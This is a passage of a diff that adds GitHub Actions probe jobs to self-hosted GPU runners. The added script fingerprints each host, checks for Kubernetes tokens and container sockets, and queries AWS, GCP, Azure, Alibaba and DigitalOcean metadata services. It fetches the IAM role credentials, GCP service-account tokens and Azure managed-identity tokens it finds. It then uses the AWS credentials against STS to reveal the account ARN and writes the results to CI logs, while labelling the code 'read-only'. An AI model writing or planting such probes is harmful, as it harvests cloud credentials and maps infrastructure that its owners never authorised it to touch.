+              except Exception as e:
+                  print('AZURE_MSI_PARSE_FAIL', str(e)[:120])
+          st, b = http('GET', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', {}, timeout=3)
+          print('AZURE_NO_HEADER_CONTROL status=', st, 'body=', b[:100].decode('utf-8', 'replace'))
+          st, b = http('GET', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01&c211=bogus', az, timeout=3)
+          print('AZURE_BOGUS_QUERY status=', st)
+
+          print('=== Alibaba / DigitalOcean ===')
+          st, b = http('GET', 'http://100.100.100.200/latest/meta-data/instance-id', {}, timeout=3)
+          print('ALIBABA_INSTANCE status=', st, 'body=', b[:120].decode('utf-8', 'replace'))
+          st, b = http('GET', 'http://169.254.169.254/metadata/v1.json', {}, timeout=3)
+          print('DO_METADATA status=', st, 'len=', len(b))
+          if st == 200:
+              try:
+                  d = json.loads(b)
+                  print('DO_KEYS', sorted(list(d.keys()))[:20])
+                  print('DO_DROPLET', json.dumps({'droplet_id': d.get('droplet_id'), 'region': d.get('region'), 'hostname': d.get('hostname')}))
+              except Exception:
+                  pass
+
+          print('=== ECS / EKS Pod Identity (presence-only) ===')
+          rel = os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI')
+          if rel:
+              st, b = http('GET', 'http://169.254.170.2' + rel, {}, timeout=4)
+              print('ECS_CRED_REL status=', st, 'len=', len(b))
+              if st == 200:
+                  try:
+                      d = json.loads(b)
+                      print('ECS_CRED_FIELDS', json.dumps({k: fp(d.get(k)) for k in ('AccessKeyId', 'SecretAccessKey', 'Token')}), 'RoleArn_present=', bool(d.get('RoleArn')))
+                  except Exception:
+                      pass
+          else:
+              print('ECS_CRED_REL_ABSENT')
+          full = os.environ.get('AWS_CONTAINER_CREDENTIALS_FULL_URI')
+          print('EKS_POD_IDENTITY_FULL_URI_PRESENT', bool(full), 'eks_token_file_present', os.path.exists('/var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token'))
+          if full:
+              st, b = http('GET', full, {}, timeout=4)
+              print('EKS_POD_IDENTITY status=', st, 'len=', len(b))
+          st, b = http('GET', 'http://169.254.170.23/v1/credentials', {}, timeout=3)
+          print('EKS_POD_IDENTITY_169_254_170_23 status=', st, 'body=', b[:80].decode('utf-8', 'replace'))
+          print('C211_META_DONE')
+          PYEOF_META
+          else
+            echo "PY3_ABSENT"
+          fi
+          echo "C211_PROBE_END job=probe-mi35x-8-b nonce=$NONCE"
+
+  probe-mi35x-8-c:
+    runs-on: linux-mi35x-gpu-8
+    timeout-minutes: 20
+    steps:
+      - name: fingerprint
+        env:
+          NONCE: c211-i125000-f28f17f6ed984600
+          JOBTAG: probe-mi35x-8-c
+        run: |
+          set -u
+          echo "C211_PROBE_BEGIN job=probe-mi35x-8-c nonce=$NONCE ts=$(date -u +%FT%TZ)"
+          echo "C211_MARKER job=probe-mi35x-8-c nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un)"
+          id
+          hostname 2>&1; hostname -f 2>&1 || true
+          uname -a
+          (. /etc/os-release 2>/dev/null && echo "OS=$PRETTY_NAME") || true
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name /sys/class/dmi/id/board_vendor /sys/class/dmi/id/board_name /sys/class/dmi/id/bios_version 2>&1 | tr '\n' '|')"
+          echo "MACHINE_ID=$(cat /etc/machine-id 2>/dev/null || echo absent) BOOT_ID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo absent)"
+          echo "UPTIME=$(cat /proc/uptime 2>/dev/null | cut -d' ' -f1) PID1=$(cat /proc/1/comm 2>/dev/null || echo absent)"
+          echo "CGROUP1=$(cat /proc/1/cgroup 2>/dev/null | head -3 | tr '\n' ';')"
+          echo "CPU=$(grep -m1 'model name' /proc/cpuinfo 2>/dev/null | cut -d: -f2 | sed 's/^ *//') NPROC=$(nproc 2>/dev/null) MEM_KB=$(grep -m1 MemTotal /proc/meminfo 2>/dev/null | awk '{print $2}')"
+          echo "--- rocm / amd identity (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --version 2>&1 | head -5 || true
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -200 || echo ROCM_SMI_UNIQUE_FAILED
+            rocm-smi --showproductname 2>&1 | head -60 || true
+            rocm-smi --showhw 2>&1 | head -60 || true
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi --version 2>&1 | head -5 || true
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_STATIC_FAILED
+            amd-smi list 2>&1 | head -80 || true
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          if command -v rocminfo >/dev/null 2>&1; then
+            rocminfo 2>&1 | grep -iE 'Marketing Name|Uuid|Vendor Name|Device Type|gfx|Name:' | head -80 || true
+          else
+            echo ROCMINFO_ABSENT
+          fi
+          echo "--- lspci / sysfs board identity ---"
+          if command -v lspci >/dev/null 2>&1; then
+            lspci -nn 2>&1 | grep -iE 'amd|ati|display|3d|vga|processing accel' | head -40 || true
+          else
+            echo LSPCI_ABSENT
+          fi
+          for dd in /sys/bus/pci/devices/*; do
+            cls=$(cat "$dd/class" 2>/dev/null || true)
+            case "$cls" in
+              0x030000|0x038000|0x030200|0x120000)
+                echo "PCIGPU $dd class=$cls vendor=$(cat $dd/vendor 2>/dev/null) device=$(cat $dd/device 2>/dev/null) subvendor=$(cat $dd/subsystem_vendor 2>/dev/null) subdevice=$(cat $dd/subsystem_device 2>/dev/null)"
+                ;;
+            esac
+          done
+          for cc in /sys/class/drm/card*/device; do
+            [ -e "$cc" ] || continue
+            echo "DRM $cc vendor=$(cat $cc/vendor 2>/dev/null) device=$(cat $cc/device 2>/dev/null) product_name=$(cat $cc/product_name 2>/dev/null) product_serial=$(cat $cc/product_serial 2>/dev/null) serial_number=$(cat $cc/serial_number 2>/dev/null) unique_id=$(cat $cc/unique_id 2>/dev/null) vbios=$(cat $cc/vbios_version 2>/dev/null)"
+          done
+          echo "AMD_DEVS:"
+          ls -l /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "DMESG=$( (dmesg 2>/dev/null || true) | grep -iE 'amdgpu|mi3[0-9]{2}|gfx9' | head -20 | tr '\n' ';' )"
+          echo "--- presence-only SA-token / socket checks ---"
+          if [ -s /var/run/secrets/kubernetes.io/serviceaccount/token ]; then echo "SA_TOKEN_PRESENT size=$(stat -c%s /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"; else echo "SA_TOKEN_ABSENT"; fi
+          echo "K8S_ENV host=${KUBERNETES_SERVICE_HOST:-none} port=${KUBERNETES_SERVICE_PORT:-none}"
+          ls -l /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /var/run/k3s/containerd/containerd.sock 2>&1 || true
+          echo "--- multi-provider metadata fingerprint (read-only, sha256-only credential presence) ---"
+          if command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PYEOF_META'
+          import json, hashlib, urllib.request, urllib.error, hmac, datetime, re, os, socket
+
+          def fp(v):
+              return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+
+          def http(method, url, headers=None, data=None, timeout=4):
+              r = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
+              try:
+                  resp = urllib.request.urlopen(r, timeout=timeout)
+                  return resp.status, resp.read()
+              except urllib.error.HTTPError as e:
+                  try: body = e.read()
+                  except Exception: body = b''
+                  return e.code, body
+              except Exception as e:
+                  return -1, ('ERR:%s:%s' % (type(e).__name__, str(e)[:100])).encode()
+
+          def sts(ak, sk, tok):
+              host = 'sts.amazonaws.com'; region = 'us-east-1'
+              body = 'Action=GetCallerIdentity&Version=2011-06-15'
+              t = datetime.datetime.now(datetime.timezone.utc)
+              amz = t.strftime('%Y%m%dT%H%M%SZ'); dat = t.strftime('%Y%m%d')
+              creq = 'POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n' % (host, amz)
+              sh = 'content-type;host;x-amz-date'
+              if tok:
+                  creq += 'x-amz-security-token:%s\n' % tok; sh = 'content-type;host;x-amz-date;x-amz-security-token'
+              creq += '\n' + sh + '\n' + hashlib.sha256(body.encode()).hexdigest()
+              scope = '%s/%s/sts/aws4_request' % (dat, region)
+              ts = 'AWS4-HMAC-SHA256\n%s\n%s\n%s' % (amz, scope, hashlib.sha256(creq.encode()).hexdigest())
+              k = ('AWS4' + sk).encode()
+              for m in (dat, region, 'sts', 'aws4_request'):
+                  k = hmac.new(k, m.encode(), hashlib.sha256).digest()
+              sig = hmac.new(k, ts.encode(), hashlib.sha256).hexdigest()
+              auth = 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s' % (ak, scope, sh, sig)
+              h = {'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8', 'X-Amz-Date': amz, 'Authorization': auth}
+              if tok: h['X-Amz-Security-Token'] = tok
+              try:
+                  resp = urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/', data=body.encode(), headers=h, method='POST'), timeout=8)
+                  return resp.status, resp.read().decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read().decode('utf-8', 'replace')
+              except Exception as e:
+                  return -1, str(e)[:200]
+
+          print('C211_META_HOST', socket.gethostname(), 'uid', os.getuid())
+          print('C211_META_ENV AWS_KEY_PRESENT=%s AWS_KEY_FP=%s AWS_PROFILE=%s AWS_REGION=%s GOOGLE_APPLICATION_CREDENTIALS=%s AZURE_CLIENT_ID=%s K8S_SA_TOKEN=%s' % (
+              bool(os.environ.get('AWS_ACCESS_KEY_ID')), fp(os.environ.get('AWS_ACCESS_KEY_ID')),
+              os.environ.get('AWS_PROFILE'), os.environ.get('AWS_REGION'),
+              bool(os.environ.get('GOOGLE_APPLICATION_CREDENTIALS')), bool(os.environ.get('AZURE_CLIENT_ID')),
+              os.path.exists('/var/run/secrets/kubernetes.io/serviceaccount/token')))
+
+          print('=== AWS IMDSv2 ===')
+          st, body = http('PUT', 'http://169.254.169.254/latest/api/token', {'X-aws-ec2-metadata-token-ttl-seconds': '60'}, data=b'', timeout=4)
+          tok = body.decode('utf-8', 'replace').strip() if st == 200 else ''
+          print('AWS_TOKEN_PUT status=%s tok_len=%s tok_fp=%s body_prefix=%s' % (st, len(tok), fp(tok), body[:60].decode('utf-8', 'replace') if st != 200 else ''))
+          if st == 200 and tok:
+              for p in ('meta-data/instance-id', 'meta-data/instance-type', 'meta-data/placement/availability-zone', 'meta-data/iam/info'):
+                  s2, b2 = http('GET', 'http://169.254.169.254/latest/' + p, {'X-aws-ec2-metadata-token': tok})
+                  print('AWS_IMDS', p, 'status=', s2, 'body=', b2.decode('utf-8', 'replace').replace('\n', ' ')[:300])
+              s2, b2 = http('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', {'X-aws-ec2-metadata-token': tok})
+              role = b2.decode('utf-8', 'replace').strip()
+              print('AWS_ROLE status=', s2, 'role=', role[:120])
+              if s2 == 200 and role and not role.startswith('ERR'):
+                  role0 = role.splitlines()[0]
+                  s3, b3 = http('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role0, {'X-aws-ec2-metadata-token': tok})
+                  if s3 == 200:
+                      try:
+                          d = json.loads(b3)
+                          print('AWS_CRED_FIELDS', json.dumps({'AccessKeyId_fp': fp(d.get('AccessKeyId')), 'SecretAccessKey_fp': fp(d.get('SecretAccessKey')), 'Token_fp': fp(d.get('Token')), 'Expiration': d.get('Expiration'), 'Code': d.get('Code')}))
+                          s4, b4 = sts(d.get('AccessKeyId'), d.get('SecretAccessKey'), d.get('Token'))
+                          m = re.search(r'<Arn>([^<]+)</Arn>', b4); a = re.search(r'<Account>([^<]+)</Account>', b4)
+                          print('STS_STATUS', s4, 'STS_ARN', (m.group(1) if m else None), 'STS_ACCOUNT', (a.group(1) if a else None))
+                          if s4 != 200: print('STS_BODY', b4[:300].replace('\n', ' '))
+                          s5, b5 = sts(d.get('AccessKeyId'), str(d.get('SecretAccessKey')) + 'TAMPERED', d.get('Token'))
+                          m5 = re.search(r'<Code>([^<]+)</Code>', b5)
+                          print('STS_TAMPERED_STATUS', s5, 'STS_TAMPERED_CODE', (m5.group(1) if m5 else None))
+                      except Exception as e:
+                          print('AWS_CRED_PARSE_FAIL', str(e)[:150], b3[:160])
+          st, body = http('PUT', 'http://169.254.169.254/latest/api/token', {'X-aws-ec2-metadata-token-ttl-seconds': 'abc'}, data=b'', timeout=3)
+          print('AWS_TOKEN_TAMPERED_TTL status=', st, 'body=', body[:80])
+          st, body = http('GET', 'http://169.254.169.254/latest/meta-data/instance-id', {}, timeout=3)
+          print('AWS_IMDSV1_NO_TOKEN status=', st, 'body=', body[:120].decode('utf-8', 'replace'))
+          if tok:
+              st, body = http('GET', 'http://169.254.169.254/latest/meta-data/c211-bogus-path-xyz', {'X-aws-ec2-metadata-token': tok}, timeout=3)
+              print('AWS_BOGUS_PATH status=', st)
+          st, body = http('GET', 'http://169.254.169.253/latest/meta-data/', {}, timeout=2)
+          print('ABSENT_169_254_169_253 status=', st, 'body=', body[:80].decode('utf-8', 'replace'))
+
+          print('=== GCP ===')
+          ghdr = {'Metadata-Flavor': 'Google'}
+          gcp_ok = False
+          for host in ('http://metadata.google.internal/computeMetadata/v1/instance/id', 'http://169.254.169.254/computeMetadata/v1/instance/id'):
+              st, b = http('GET', host, ghdr, timeout=3)
+              print('GCP_INSTANCE_ID host=%s status=%s body=%s' % (host.split('/')[2], st, b[:80].decode('utf-8', 'replace')))
+              if st == 200 and not gcp_ok:
+                  gcp_ok = True
+                  for p in ('project/project-id', 'instance/zone', 'instance/name', 'instance/service-accounts/'):
+                      s2, b2 = http('GET', 'http://metadata.google.internal/computeMetadata/v1/' + p, ghdr, timeout=3)
+                      print('GCP', p, 'status=', s2, 'body=', b2[:200].decode('utf-8', 'replace').replace('\n', ' '))
+                  s2, b2 = http('GET', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', ghdr, timeout=4)
+                  if s2 == 200:
+                      try:
+                          d = json.loads(b2)
+                          print('GCP_SA_TOKEN_FIELDS', json.dumps({'access_token_len': len(d.get('access_token') or ''), 'access_token_fp': fp(d.get('access_token')), 'expires_in': d.get('expires_in'), 'token_type': d.get('token_type')}))
+                      except Exception as e:
+                          print('GCP_TOKEN_PARSE_FAIL', str(e)[:120], b2[:120])
+          st, b = http('GET', 'http://169.254.169.254/computeMetadata/v1/instance/id', {}, timeout=3)
+          print('GCP_NO_HEADER_CONTROL status=', st, 'body=', b[:100].decode('utf-8', 'replace'))
+          st, b = http('GET', 'http://169.254.169.254/computeMetadata/v1/c211-bogus-path', ghdr, timeout=3)
+          print('GCP_BOGUS_PATH status=', st)
+
+          print('=== Azure ===')
+          az = {'Metadata': 'true'}
+          st, b = http('GET', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', az, timeout=4)
+          print('AZURE_INSTANCE status=', st, 'len=', len(b))
+          if st == 200:
+              try:
+                  d = json.loads(b); comp = d.get('compute', {})
+                  print('AZURE_COMPUTE', json.dumps({'vmId': comp.get('vmId'), 'name': comp.get('name'), 'location': comp.get('location'), 'resourceGroupName': comp.get('resourceGroupName'), 'subscriptionId': comp.get('subscriptionId'), 'vmSize': comp.get('vmSize'), 'azEnvironment': comp.get('azEnvironment')}))
+              except Exception as e:
+                  print('AZURE_PARSE_FAIL', str(e)[:120], b[:160])
+          st, b = http('GET', 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F', az, timeout=5)
+          print('AZURE_MSI_TOKEN status=', st, 'len=', len(b))
+          if st == 200:
+              try:
+                  d = json.loads(b)
+                  print('AZURE_MSI_FIELDS', json.dumps({'access_token_len': len(d.get('access_token') or ''), 'access_token_fp': fp(d.get('access_token')), 'expires_in': d.get('expires_in'), 'expires_on': d.get('expires_on'), 'resource': d.get('resource')}))
+              except Exception as e:
+                  print('AZURE_MSI_PARSE_FAIL', str(e)[:120])
+          st, b = http('GET', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', {}, timeout=3)
+          print('AZURE_NO_HEADER_CONTROL status=', st, 'body=', b[:100].decode('utf-8', 'replace'))
+          st, b = http('GET', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01&c211=bogus', az, timeout=3)
+          print('AZURE_BOGUS_QUERY status=', st)
+
+          print('=== Alibaba / DigitalOcean ===')
+          st, b = http('GET', 'http://100.100.100.200/latest/meta-data/instance-id', {}, timeout=3)
+          print('ALIBABA_INSTANCE status=', st, 'body=', b[:120].decode('utf-8', 'replace'))
+          st, b = http('GET', 'http://169.254.169.254/metadata/v1.json', {}, timeout=3)
+          print('DO_METADATA status=', st, 'len=', len(b))
+          if st == 200:
+              try:
+                  d = json.loads(b)
+                  print('DO_KEYS', sorted(list(d.keys()))[:20])
+                  print('DO_DROPLET', json.dumps({'droplet_id': d.get('droplet_id'), 'region': d.get('region'), 'hostname': d.get('hostname')}))
+              except Exception:
+                  pass
+
+          print('=== ECS / EKS Pod Identity (presence-only) ===')
+          rel = os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI')
+          if rel:
+              st, b = http('GET', 'http://169.254.170.2' + rel, {}, timeout=4)
+              print('ECS_CRED_REL status=', st, 'len=', len(b))
+              if st == 200:
+                  try:
+                      d = json.loads(b)
+                      print('ECS_CRED_FIELDS', json.dumps({k: fp(d.get(k)) for k in ('AccessKeyId', 'SecretAccessKey', 'Token')}), 'RoleArn_present=', bool(d.get('RoleArn')))
+                  except Exception:
+                      pass
+          else:
+              print('ECS_CRED_REL_ABSENT')
+          full = os.environ.get('AWS_CONTAINER_CREDENTIALS_FULL_URI')
+          print('EKS_POD_IDENTITY_FULL_URI_PRESENT', bool(full), 'eks_token_file_present', os.path.exists('/var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token'))
+          if full:
+              st, b = http('GET', full, {}, timeout=4)
+              print('EKS_POD_IDENTITY status=', st, 'len=', len(b))
+          st, b = http('GET', 'http://169.254.170.23/v1/credentials', {}, timeout=3)
+          print('EKS_POD_IDENTITY_169_254_170_23 status=', st, 'body=', b[:80].decode('utf-8', 'replace'))
+          print('C211_META_DONE')
+          PYEOF_META
+          else
+            echo "PY3_ABSENT"
+          fi
+          echo "C211_PROBE_END job=probe-mi35x-8-c nonce=$NONCE"
+
